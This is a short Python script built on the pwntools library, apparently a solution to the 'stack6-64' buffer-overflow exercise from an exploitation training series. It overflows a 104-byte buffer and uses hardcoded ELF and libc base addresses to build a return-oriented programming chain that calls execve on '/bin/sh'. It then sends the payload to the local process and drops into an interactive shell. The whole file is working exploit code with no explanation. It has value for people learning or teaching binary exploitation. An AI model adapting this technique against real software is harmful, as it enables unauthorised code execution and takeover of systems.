import struct
import sys

from pwn import *

context.binary = elf = ELF('./stack6-64')
libc = elf.libc

offset = 104

elf.address = 0x400000
libc.address = 0x7ffff7dc4000

rop = ROP([elf,libc])

binsh = next(libc.search(b'/bin/sh\x00'))
rop.execve(binsh,0,0)



expl = offset*b'A' + bytes(rop)

#sys.stderr.buffer.write(expl)
p = process('./stack6-64')

p.sendline(expl)
p.interactive()
